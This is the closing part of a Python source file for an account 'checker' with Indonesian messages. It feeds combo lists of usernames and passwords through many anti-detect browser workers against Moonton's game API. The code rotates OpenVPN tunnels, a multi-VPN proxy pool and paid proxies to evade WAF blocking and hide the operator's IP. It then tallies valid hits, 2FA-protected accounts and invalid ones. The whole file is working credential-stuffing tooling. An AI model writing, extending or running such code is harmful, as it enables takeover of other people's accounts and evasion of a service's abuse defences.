            elif os.path.exists(os.path.join(PROJECT_ROOT, args.proxy_file)):
                PROXY_FILE = os.path.join(PROJECT_ROOT, args.proxy_file)
            else:
                PROXY_FILE = os.path.abspath(args.proxy_file)
        if (not PROXY_ENABLED) and not vpn_cmd and not vpn_wait:
            if not ovpn_dir and ovpn_dirs:
                print(f"  {c(GRAY)}Mode VPN: [1] OpenVPN Auto ({avail_ovpn} .ovpn, {len(ovpn_dirs)} folder)  [2] Manual VPN{W}")
                v_mode = ask("Pilih mode jaringan (1-2)", "1")
                if v_mode == "2":
                    vpn_wait = True
                else:
                    while True:
                        print(f"  {c(CYAN)}Daftar folder OpenVPN:{W}")
                        for idx_d, (lbl_d, path_d, cnt_d) in enumerate(ovpn_dirs, 1):
                            auth_tag = f" {c(GREEN)}auth✓{W}" if _has_ovpn_auth(path_d) else f" {c(GOLD)}(no auth.txt){W}"
                            print(f"    {c(WHITE)}[{idx_d}]{W} {lbl_d} {c(GRAY)}({cnt_d} .ovpn){W}{auth_tag}")
                        print(f"    {c(GRAY)}[0] Kembali ke Manual VPN{W}")
                        sel = ask(f"Pilih folder VPN (0-{len(ovpn_dirs)} / path)", "1")
                        if sel == "0":
                            vpn_wait = True
                            break
                        if sel.isdigit() and 1 <= int(sel) <= len(ovpn_dirs):
                            ovpn_dir = ovpn_dirs[int(sel) - 1][1]
                            break
                        cand_d = _resolve_ovpn_dir_input(sel)
                        if _count_ovpn_files(cand_d) > 0:
                            ovpn_dir = cand_d
                            break
                        p_out(f"  {c(RED)}[!] Folder tidak ditemukan atau tidak berisi *.ovpn: {sel}{W}")
            elif not ovpn_dir:
                p_out(f"  {c(GOLD)}[!] Belum ada folder *.ovpn di {shortpath(BASE)} -> isi path folder atau kosong untuk Manual VPN.{W}")
                custom_d = ask("Folder .ovpn (kosong = Manual VPN)", "")
                if custom_d:
                    cand_d = _resolve_ovpn_dir_input(custom_d)
                    if _count_ovpn_files(cand_d) > 0:
                        ovpn_dir = cand_d
                    else:
                        p_out(f"  {c(GOLD)}[!] Tidak ada *.ovpn di {custom_d} -> masuk Mode Manual VPN.{W}")
                        vpn_wait = True
                else:
                    vpn_wait = True
            if ovpn_dir:
                vpn_waf_threshold = max(8, min(16, workers))
                skip_ovpn_test = False
                _pool_sh = os.path.join(BASE, 'vpn_pool.sh')
                if os.name != 'nt' and os.path.isfile(_pool_sh) and not args.no_prompt:
                    if ask_yn("Multi-VPN proxy pool? (anti-pause, tiap worker beda IP)", default='y'):
                        _miss = [b for b in ('openvpn', 'microsocks', 'iptables', 'ip') if not shutil.which(b)]
                        if hasattr(os, 'geteuid') and os.geteuid() != 0:
                            p_out(f"  {c(GOLD)}[!] Multi-VPN butuh root/sudo -> lanjut OpenVPN tunggal.{W}")
                        elif _miss:
                            p_out(f"  {c(GOLD)}[!] Multi-VPN butuh {', '.join(_miss)} (apt-get install -y openvpn microsocks iptables) -> lanjut OpenVPN tunggal.{W}")
                        else:
                            _def_sl = str(min(8, max(4, int(hw_info.get('cpus', 4)))))
                            _sl_in = ask("Jumlah tunnel Multi-VPN (2-16)", _def_sl).strip()
                            multi_vpn_slots = max(2, min(16, int(_sl_in) if _sl_in.isdigit() else int(_def_sl)))
                            multi_vpn_dir = _resolve_ovpn_dir_input(ovpn_dir)
                            multi_vpn_sh = _pool_sh
                            PROXY_ENABLED = True
                            PROXY_FILE = os.path.join(BASE, 'vpn_proxies.txt')

    NUM_CONTEXTS = workers

    # Load combos & apply per-input folder resume (output/<nama_file_input>/)
    if not os.path.isabs(combo_path):
        if os.path.exists(combo_path):
            combo_path = os.path.abspath(combo_path)
        elif os.path.exists(os.path.join(BASE, 'input', combo_path)):
            combo_path = os.path.join(BASE, 'input', combo_path)
        else:
            combo_path = os.path.join(BASE, combo_path)
    if not args.out:
        _stem = re.sub(r'[^A-Za-z0-9._-]+', '_', os.path.splitext(os.path.basename(combo_path))[0]).strip('._-') or 'default'
        OUTPUT_DIR = os.path.join(BASE, 'output', _stem)
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    combos = load_combos(combo_path)
    done_accounts = load_done()
    queue = [x for x in combos if _norm_combo_key(x[0], x[1]) not in done_accounts]

    vpn_ip_init = 'unknown'
    try:
        vpn_coord = None if PROXY_ENABLED else VpnCoordinator(
            vpn_cmd=vpn_cmd, vpn_wait=vpn_wait, waf_threshold=vpn_waf_threshold,
            waf_cooldown=waf_cooldown, rotate_every=vpn_rotate_every,
            ip_check=vpn_ip_check, current_ip=vpn_ip_init,
            ovpn_dir=ovpn_dir, ovpn_auth=args.vpn_ovpn_auth,
        )
    except RuntimeError as ve:
        p_out(f"{c(RED)}[!] {ve}{W}")
        return
    if (not PROXY_ENABLED) and vpn_ip_check and not (vpn_coord and vpn_coord.ovpn_files):
        vpn_ip_init = await fetch_public_ip(timeout_s=4.5)
        vpn_coord.current_ip = vpn_ip_init

    _mode_str = (f"Multi-VPN ({multi_vpn_slots} tunnel -> {shortpath(PROXY_FILE)})" if multi_vpn_slots > 0 else shortpath(PROXY_FILE)) if PROXY_ENABLED else (
        f"OpenVPN auto ({shortpath(vpn_coord.ovpn_dir)}: {len(vpn_coord.ovpn_files)} .ovpn)" if (vpn_coord and vpn_coord.ovpn_files) else (
            f"{vpn_coord.label()} (cmd)" if vpn_cmd else (f"{vpn_coord.label()} (manual-wait)" if vpn_wait else f"{vpn_coord.label()} (cooldown {int(waf_cooldown)}s)")
        )
    )
    _w_cfg_str = (
        f"AUTO (uji CPU/RAM real, {'auto' if auto_two_tab else ('2' if TWO_TAB else '1')}-tab)"
        if auto_workers else
        f"{NUM_CONTEXTS} ctx x {2 if TWO_TAB else 1} tab ({NUM_CONTEXTS * (2 if TWO_TAB else 1)} streams)"
    )
    _print_box("CONFIGURATION", [
        f" {c(WHITE)}Platform:{W} {c(CYAN)}{_PLAT['tag']} ({_PLAT['arch']}){W}",
        f" {c(WHITE)}Queue   :{W} {c(GREEN)}{len(queue):,} accounts{W} {c(GRAY)}(tot:{len(combos):,}, done:{len(done_accounts):,}){W}",
        f" {c(WHITE)}Workers :{W} {c(CYAN)}{_w_cfg_str}{W}",
        f" {c(WHITE)}Network :{W} {c(GOLD)}{_mode_str}{W}",
        f" {c(WHITE)}Output  :{W} {c(GRAY)}{shortpath(OUTPUT_DIR)}/{W}",
    ], bc=GRAY)

    if not queue:
        p_out(f"{c(GREEN)}[*] Semua akun pada file combo sudah selesai diperiksa.{W}")
        return

    # Inisialisasi DeviceManager
    dm = None
    if INFO_OK and DeviceManager:
        try:
            dev_file = DEVICES_FILE if os.path.exists(DEVICES_FILE) else os.path.join(PROJECT_ROOT, 'Base', 'devices.txt')
            dm = DeviceManager(dev_file)
            p_out(f"{c(GREEN)}[*] Player Info Lookup : AKTIF ({len(dm.devices)} devices){W}")
        except Exception as e:
            p_out(f"{c(GOLD)}[!] DeviceManager init note: {e}{W}")
    elif INFO_IMPORT_ERR:
        p_out(f"{c(GOLD)}[!] Player Info Lookup NONAKTIF ({INFO_IMPORT_ERR}){W}")

    # Pastikan hanya 1 instance browser.py berjalan agar seat CloakBrowser & CPU tidak bentrok
    _inst_lock = None
    aborted_on_errors = False
    interrupted = False
    stats['start'] = time.time()
    class _TrackQueue(asyncio.Queue):
        def __init__(self):
            super().__init__()
            self.pending = 0
        def put_nowait(self, item):
            super().put_nowait(item)
            self.pending += 1
        def task_done(self):
            self.pending = max(0, self.pending - 1)
            super().task_done()

    combo_q = _TrackQueue()
    _hb_task = None
    activate_cloak_license(args.license_key)
    p_out(f"{c(CYAN)}[*] Menyiapkan engine browser...{W}")
    browser_ref = [None]
    browser_lock = asyncio.Lock()
    browser_state = {'born_ctx': 0, 'born_chk': 0, 'force_recycle': False, 'active': 0, 'recycling': False, 'last_relaunch': 0.0, 'gate': asyncio.Event(), 'zero_evt': asyncio.Event()}
    browser_state['gate'].set()
    browser_state['zero_evt'].set()
    tasks = []

    async def ensure_browser(force_relaunch: bool = False, stale_browser=None):
        global _driver_pid, _pw_instance
        async with browser_lock:
            cur = browser_ref[0]
            if force_relaunch and cur is not None:
                # ponytail: exact pointer check when stale_browser given; cooldown fallback otherwise
                if stale_browser is not None:
                    if cur is not stale_browser:
                        force_relaunch = False
                elif time.monotonic() - browser_state['last_relaunch'] < 8.0:
                    force_relaunch = False
            need = force_relaunch or (cur is None)
            if not need:
                try:
                    need = not cur.is_connected()
                except Exception:
                    need = True
            if need:
                if cur is not None:
                    try:
                        await asyncio.wait_for(cur.close(), timeout=5.0)
                    except Exception:
                        _kill_driver_tree()
                    browser_ref[0] = None
                if _pw_instance is not None:
                    try:
                        await asyncio.wait_for(_pw_instance.stop(), timeout=3.0)
                    except Exception:
                        _kill_driver_tree()
                    _pw_instance = None
                _driver_pid = None
                if force_relaunch:
                    await asyncio.sleep(2.0)
                browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=False)
                browser_state['last_relaunch'] = time.monotonic()
            return browser_ref[0]

    try:
        try:
            _inst_lock = _acquire_instance_lock()
        except RuntimeError as le:
            p_out(f"{c(RED)}[!] {le}{W}")
            return
        if multi_vpn_slots > 0 and multi_vpn_sh:
            p_out(f"{c(CYAN)}[*] Menyalakan {multi_vpn_slots} tunnel Multi-VPN ({shortpath(multi_vpn_dir)})...{W}")
            multi_vpn_started = True
            _VPNPOOL_CFG['sh'] = multi_vpn_sh
            _vp_proc = await asyncio.create_subprocess_exec(
                'bash', multi_vpn_sh, 'start', multi_vpn_dir, str(multi_vpn_slots), PROXY_FILE,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
            )
            try:
                _vp_out, _ = await asyncio.wait_for(_vp_proc.communicate(), timeout=45.0)
            except asyncio.TimeoutError:
                _kill_pid_tree(_vp_proc.pid)
                p_out(f"{c(RED)}[!] Timeout menyalakan Multi-VPN pool.{W}")
                return
            for _vln in (_vp_out or b'').decode('utf-8', errors='ignore').splitlines():
                if _vln.strip():
                    p_out(f"  {c(GRAY)}{_vln}{W}")
            if _vp_proc.returncode != 0:
                p_out(f"{c(RED)}[!] Multi-VPN gagal dinyalakan -> cek nesting=1 / auth.txt / .ovpn.{W}")
                return
        if vpn_coord and vpn_coord.ovpn_files:
            if not skip_ovpn_test:
                good_ovpns = await vpn_coord.probe_ovpns(use_cache=not bool(args.retest_ovpn))
                if not good_ovpns:
                    p_out(f"\n  {c(RED)}{BD}[!] Semua config OpenVPN gagal terhubung ke API Moonton.{W}")
                    p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
                    return
            if not await vpn_coord.start_initial_ovpn(stats):
                return
        _load_static_cache()
        browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=False)
        browser_state['last_relaunch'] = time.monotonic()

        spawn_w = min(NUM_CONTEXTS, max(1, len(queue)))
        start_w = spawn_w
        if auto_workers:
            p_out(f"{c(CYAN)}[*] Menguji kecepatan CPU & kapasitas RAM VPS (auto worker)...{W}")
            _bw, _b2t, _bhmax, _bmsg = await _benchmark_vps_capacity(browser_ref[0], hw=hw_info, choose_two_tab=auto_two_tab)
            start_w = min(_bw, max(1, len(queue)))
            spawn_w = min(max(1, len(queue)), max(start_w, _bhmax))
            NUM_CONTEXTS = workers = spawn_w
            if auto_two_tab:
                TWO_TAB = _b2t
            p_out(f"{c(GREEN)}[*] {_bmsg} ✓{W}")
        else:
            NUM_CONTEXTS = workers = spawn_w
        if vpn_coord and vpn_coord.ovpn_files:
            vpn_coord.waf_threshold = max(vpn_coord.waf_threshold, min(16, max(8, start_w)))

        # Proxy testing & assignment
        proxy_assignments = [None] * NUM_CONTEXTS
        live_pool = None
        if PROXY_ENABLED:
            raw_p = load_proxies(PROXY_FILE)
            if not raw_p:
                p_out(f"\n  {c(RED)}{BD}[!] File proxy kosong atau tidak ditemukan: {PROXY_FILE}{W}")
                p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
                return
            p_out(f"{c(CYAN)}[*] Menguji ping proxy ke API Moonton ({len(raw_p)} proxy)...{W}")
            good_proxies = await test_proxies(raw_p, concurrency=16)
            if good_proxies:
                fast_cap = good_proxies[:max(24, NUM_CONTEXTS * 3)]
                p_out(f"{c(GREEN)}[*] {len(good_proxies)} proxy berfungsi, pakai {len(fast_cap)} tercepat ✓{W}")
                live_pool = [p[1] for p in fast_cap]
                for i in range(NUM_CONTEXTS):
                    proxy_assignments[i] = fast_cap[i % len(fast_cap)][1]
            else:
                p_out(f"\n  {c(RED)}{BD}[!] Semua proxy gagal diuji.{W}")
                p_out(f"  {c(GOLD)}Penyebab: Kuota DataImpulse habis (407 TRAFFIC_EXHAUSTED) atau proxy offline.{W}")
                p_out(f"  {c(GRAY)}Eksekusi dibatalkan otomatis untuk melindungi IP asli kamu.{W}\n")
                return

        _PROXY_FAILS.clear()
        stats['total'] = len(queue)
        stats['start'] = time.time()
        _PERF.reset()
        _PERF.configure_workers(min_w=min(2, spawn_w), start_w=start_w, max_w=spawn_w, auto_scale=True)
        stats['workers_total'] = spawn_w
        stats['workers'] = _PERF.target_workers
        stats['proxy_label'] = f"{os.path.basename(PROXY_FILE)} ({len(live_pool or [])} live)" if PROXY_ENABLED else vpn_coord.label()
        _TUI_ACTIVE = bool(_IS_TTY and (_TERM != 'dumb') and _COLOR_OK)
        if _TUI_ACTIVE:
            sys.stdout.write("\033[?1049h\033[?25l\033[2J\033[H")
            sys.stdout.flush()
            render_dashboard(force=True)
        async def _tui_heartbeat():
            while True:
                await asyncio.sleep(2.0)
                if _TUI_ACTIVE:
                    render_dashboard(force=True)
                if stats.get('status') != 'RUNNING' or combo_q.pending <= 0:
                    continue
                if vpn_coord is not None and (vpn_coord.ovpn_failed or vpn_coord.rotating):
                    continue
                _hw_now = _detect_vps_hw()
                avail_mb = _hw_now.get('avail_mb', 0.0)
                _ram_floor = 450.0 if _hw_now.get('no_swap') else 360.0
                can_rot = vpn_coord is not None and (len(vpn_coord.ovpn_files) > 1 or bool(vpn_coord.vpn_cmd))
                ctx_age = stats['checked'] - browser_state.get('born_chk', 0)
                act, info = _PERF.decide_action(avail_mb, can_rot, ctx_age, browser_state['recycling'], ram_floor_mb=_ram_floor)
                if act == 'NONE':
                    continue
                _PERF.last_action_t = time.monotonic()
                if act == 'SCALE_UP':
                    new_w = int(info.get('new_w', _PERF.target_workers))
                    old_w = _PERF.target_workers
                    why = info.get('reason', f"{info.get('cur_r', 0.0):.1f}/s")
                    tag_n = f"{new_w}/{_PERF.max_workers}w +"
                    await _PERF.set_target_workers(new_w, tag_n)
                    msg = f"SMART {old_w}->{new_w}w ({why})"
                    _LIVE_LOGS.append(f" {c(CYAN)}*{W}  {c(CYAN)}{msg[:54]}{W}")
                    if not _TUI_ACTIVE:
                        p_out(f"  {c(CYAN)}[SMART] {msg}{W}")
                elif act == 'RECYCLE_BROWSER':
                    _PERF.last_heal_t = time.monotonic()
                    _PERF.drop_since_t = 0.0
                    _PERF.pause_until_t = time.monotonic() + 28.0
                    h_cur, h_peak = info.get('cur_r', 0.0), info.get('peak_r', 0.0)
                    _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}SMART HEAL: recycle browser ({h_cur:.2f} vs {h_peak:.2f}/s){W}")
                    if not _TUI_ACTIVE:
                        p_out(f"  {c(GOLD)}[SMART] {info.get('reason', 'LOCK')} -> recycle Chromium...{W}")
                    browser_state['force_recycle'] = True
                elif act == 'ROTATE_VPN' and can_rot:
                    _PERF.last_heal_t = time.monotonic()
                    _PERF.drop_since_t = 0.0
                    h_tag = info.get('tag', 'SLOW')
                    _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}SMART VPN: {info.get('reason', h_tag)} -> rotasi VPN{W}")
                    if not _TUI_ACTIVE:
                        p_out(f"  {c(GOLD)}[SMART] {info.get('reason', h_tag)} -> rotasi VPN...{W}")
                    try:
                        await vpn_coord.coordinate(f"slow:{h_tag.lower()}", vpn_coord.epoch, browser_state, stats)
                    except RuntimeError:
                        pass
        _hb_task = asyncio.create_task(_tui_heartbeat())

        # asyncio.Queue: thread-safe, tidak ada race condition saat banyak worker
        # menarik combo secara bersamaan (tidak seperti shared iterator/next()).
        for item in queue:
            combo_q.put_nowait(item)

        acct_retries = {}

        # Worker wrapper: auto-restart jika worker crash sebelum queue habis / batas wave 1k.
        async def worker_with_restart(wid: int, p_info, wave_limit: int = 0, wave_idx: int = 0):
            MAX_CONSECUTIVE_FAILS = 10
            fail_count = 0
            while (combo_q.pending > 0) and not (wave_limit and stats['checked'] >= wave_limit) and not (vpn_coord and vpn_coord.ovpn_failed):
                started_at = time.time()
                try:
                    cur_b = await ensure_browser(force_relaunch=(fail_count >= 6 and browser_state['active'] == 0))
                    await run_worker(
                        wid, queue, combo_q, cur_b, dm, p_info, live_pool,
                        ensure_browser=ensure_browser, browser_state=browser_state,
                        acct_retries=acct_retries, wave_limit=wave_limit, wave_idx=wave_idx,
                        vpn_coord=vpn_coord,
                    )
                    if combo_q.pending <= 0 or (wave_limit and stats['checked'] >= wave_limit) or (vpn_coord and vpn_coord.ovpn_failed):
                        break  # selesai wave / semua item selesai
                    while combo_q.empty() and combo_q.pending > 0 and not (wave_limit and stats['checked'] >= wave_limit):
                        await asyncio.sleep(0.5)
                    if combo_q.pending <= 0 or (wave_limit and stats['checked'] >= wave_limit):
                        break
                except asyncio.CancelledError:
                    raise  # propagate Ctrl+C
                except Exception as e:
                    if time.time() - started_at > 60:
                        fail_count = 0  # reset counter after sustained healthy work
                    fail_count += 1
                    if fail_count > MAX_CONSECUTIVE_FAILS:
                        _PERF.mark_worker_dead(wid)
                        if not _TUI_ACTIVE:
                            p_out(f"{c(RED)}[!] w{wid} crash {MAX_CONSECUTIVE_FAILS}x berturut-turut, dihentikan: {e}{W}")
                        else:
                            print_result('ERR', f"worker-{wid}", "sys", f"stopped:{str(e)[:15]}")
                        break
                    if wave_limit and stats['checked'] >= wave_limit:
                        break
                    if vpn_coord and vpn_coord.ovpn_failed:
                        break
                    wait = min(2 ** min(fail_count, 4), 16)  # exponential backoff max 16s
                    if not _TUI_ACTIVE:
                        p_out(f"{c(GOLD)}[!] w{wid} crash #{fail_count}, restart dalam {wait}s...{W}")
                    else:
                        print_result('ERR', f"worker-{wid}", "sys", f"restart #{fail_count}")
                    await asyncio.sleep(wait)

        try:
            wave_idx = 0
            while combo_q.pending > 0 and not (vpn_coord and vpn_coord.ovpn_failed):
                _PROXY_FAILS.clear()
                checked_before = stats['checked']
                wave_limit = checked_before + WAVE_REFRESH_EVERY
                num_workers = min(NUM_CONTEXTS, max(1, combo_q.pending))
                if num_workers < _PERF.max_workers:
                    _PERF.max_workers = num_workers
                    _PERF.min_workers = min(_PERF.min_workers, num_workers)
                    _PERF.target_workers = min(_PERF.target_workers, num_workers)
                if wave_idx > 0:
                    _PERF.dead_workers.clear()
                    _PERF.resume()
                stats['workers'] = min(_PERF.live_workers(), num_workers)
                stats['workers_total'] = num_workers
                stats['status'] = 'RUNNING'
                render_dashboard(force=True)

                tasks = []
                for i in range(num_workers):
                    p_info = proxy_assignments[(i + wave_idx) % NUM_CONTEXTS] if PROXY_ENABLED else None
                    tasks.append(asyncio.create_task(worker_with_restart(i, p_info, wave_limit=wave_limit, wave_idx=wave_idx)))

                await asyncio.gather(*tasks)

                if vpn_coord and vpn_coord.ovpn_failed:
                    aborted_on_errors = True
                    break
                if combo_q.pending <= 0:
                    break
                if stats['checked'] == checked_before or stats['checked'] < wave_limit:
                    aborted_on_errors = True
                    break

                # ponytail: full clean wave restart every 1k accounts; keep _STATIC_CACHE and _TUNNEL_BLACKLIST
                wave_idx += 1
                stats['status'] = 'REFRESH'
                if _TUI_ACTIVE:
                    render_dashboard(force=True)
                else:
                    p_out(f"\n{c(CYAN)}[*] Refresh penuh wave #{wave_idx} ({stats['checked']:,} akun): restart semua worker & Chromium...{W}")
                gc.collect()
                for _rw in range(3):
                    try:
                        await ensure_browser(force_relaunch=True, stale_browser=browser_ref[0])
                        break
                    except Exception as r_ex:
                        if _rw == 2:
                            aborted_on_errors = True
                            if not _TUI_ACTIVE:
                                p_out(f"{c(RED)}[!] Gagal refresh browser wave #{wave_idx}: {r_ex}{W}")
                            break
                        await asyncio.sleep(10.0 * (_rw + 1))
                if aborted_on_errors:
                    break
                browser_state['born_ctx'] = stats['proxy_ctx']
                browser_state['born_chk'] = stats['checked']
                browser_state['force_recycle'] = False
                browser_state['active'] = 0
                browser_state['recycling'] = False
                browser_state['gate'].set()
                browser_state['zero_evt'].set()
        except (KeyboardInterrupt, asyncio.CancelledError):
            interrupted = True
            aborted_on_errors = True
            if _TUI_ACTIVE:
                _TUI_ACTIVE = False
                sys.stdout.write("\033[?1049l\033[?25h\n")
                sys.stdout.flush()
            p_out(f"\n{Y}[*] Menghentikan worker...{W}")
            for t in tasks:
                t.cancel()
            # Tunggu sebentar agar semua worker bisa cleanup dengan benar
            await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        if _hb_task is not None:
            _hb_task.cancel()
            try:
                await _hb_task
            except BaseException:
                pass
        if _CACHE_DIRTY:
            _save_static_cache()
        if _TUI_ACTIVE:
            stats['status'] = 'DONE'
            render_dashboard(force=True)
            _TUI_ACTIVE = False
            sys.stdout.write("\033[?1049l\033[?25h\n")
            sys.stdout.flush()
        if browser_ref[0]:
            try:
                await asyncio.wait_for(browser_ref[0].close(), timeout=5.0)
            except BaseException:
                _kill_driver_tree()
        if _pw_instance:
            try:
                await asyncio.wait_for(_pw_instance.stop(), timeout=3.0)
            except BaseException:
                _kill_driver_tree()
            _pw_instance = None
        _driver_pid = None
        if _lookup_exec is not None:
            try:
                _lookup_exec.shutdown(wait=False, cancel_futures=True)
            except Exception:
                pass
            _lookup_exec = None
        if _LICENSE_SESSION_ACTIVE:
            withdraw_cloak_license()
            p_out(f"{c(GRAY)}[*] License key CloakBrowser ditarik dari device ✓{W}")
        if multi_vpn_started and multi_vpn_sh:
            _VPNPOOL_CFG['sh'] = ''
            try:
                _sp = await asyncio.create_subprocess_exec(
                    'bash', multi_vpn_sh, 'stop',
                    stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.wait_for(_sp.wait(), timeout=12.0)
            except BaseException:
                pass
        if vpn_coord is not None:
            vpn_coord.ovpn_started = False
            if vpn_coord._ovpn_proc is not None or vpn_coord.ovpn_files:
                try:
                    await vpn_coord.stop_ovpn()
                except BaseException:
                    _kill_ovpn_tree()
            try:
                await vpn_coord.restore_warp_if_needed()
            except BaseException:
                pass
        _release_instance_lock(_inst_lock)

    if interrupted:
        return
    el = max(time.time() - stats['start'], 1)
    ck = stats['checked']
    _bn = _PERF.summary()
    _done_rows = [
        f" {c(WHITE)}{BD}TOTAL CHECKED{W} : {ck:,} accounts",
        f" {c(GREEN)}{BD}{S_OK} VALID HITS {W} : {stats['valid']:,}",
        f" {c(GOLD)}{BD}{S_STAR} 2FA / OTP  {W} : {stats['otp']:,}",
        f" {c(RED)}{BD}{S_ERR} INVALID    {W} : {stats['invalid']:,}",
        f" {c(GRAY)}{BD}! ERRORS     {W} : {stats['error']:,}",
        f" {c(CYAN)}SPEED / TIME {W} : {ck/el:.2f} acc/s  ({int(el)}s)",
        f" {c(GOLD)}PROXY QUOTA  {W} : {_fmt_bytes(stats['bytes_used'])} ({_fmt_bytes(int(stats['bytes_used']/max(ck,1)))}/acc)",
        f" {c(GRAY)}OUTPUT DIR   {W} : {shortpath(OUTPUT_DIR)}/",
    ]
    if _bn:
        _done_rows.append(f" {c(GOLD)}BOTTLENECK   {W} : {_bn}")
    _print_box("CHECK COMPLETE", _done_rows, bc=(GOLD if aborted_on_errors else GREEN))
    if aborted_on_errors:
        if vpn_coord and vpn_coord.ovpn_failed:
            p_out(f"{c(RED)}[!] Dihentikan otomatis: semua config OpenVPN gagal rotasi (IP asli dilindungi, sisa {combo_q.qsize():,} akun belum diperiksa).{W}")
        else:
            p_out(f"{c(GOLD)}[!] Dihentikan lebih awal: worker berhenti atau gagal refresh (sisa {combo_q.qsize():,} akun belum diperiksa).{W}")

def main():
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        p_out(f"\n{Y}Program dihentikan.{W}")
    finally:
        _emergency_cleanup()

if __name__ == '__main__':
    main()
